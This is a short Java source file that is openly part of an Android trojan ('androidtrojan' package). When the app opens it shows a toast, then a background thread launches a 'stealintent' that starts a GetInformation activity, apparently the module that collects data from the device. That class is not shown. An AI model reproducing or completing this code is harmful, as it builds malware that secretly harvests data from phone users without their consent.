package com.example.gx.androidtrojan;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.widget.Toast;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Toast.makeText(MainActivity.this,"start success",Toast.LENGTH_LONG).show();
        new StartGetInformationThread(MainActivity.this).start();
    }
}

class StartGetInformationThread extends Thread{
    private Context context;
    public StartGetInformationThread(Context context) {
        super();
        this.context=context;
    }

    //子进程执行的操作
    public void run(){
        Intent stealintent = new Intent(context, GetInformation.class);
        stealintent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        context.startActivity(stealintent);
    }
}
